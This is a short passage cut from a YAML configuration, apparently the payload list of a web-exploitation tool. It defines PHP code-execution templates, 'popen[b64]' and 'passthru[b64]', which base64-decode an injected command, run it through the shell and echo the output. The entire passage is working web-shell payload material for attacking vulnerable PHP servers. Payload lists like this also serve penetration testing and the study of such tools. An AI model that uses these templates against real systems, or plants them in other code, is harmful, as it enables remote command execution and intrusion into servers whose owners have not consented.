    win: false
    dobase64: true
    name: "popen[b64]"
    source: '<?php $h=popen(base64_decode("__PAYLOAD__") . " 2>&1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>'
  - unix: true
    win: false
    dobase64: true
    name: "passthru[b64]"
    source: '<?php passthru (base64_decode("__PAYLOAD__"). " 2>&1"); ?>'
  - unix: true
    win: false
    dobase64: true
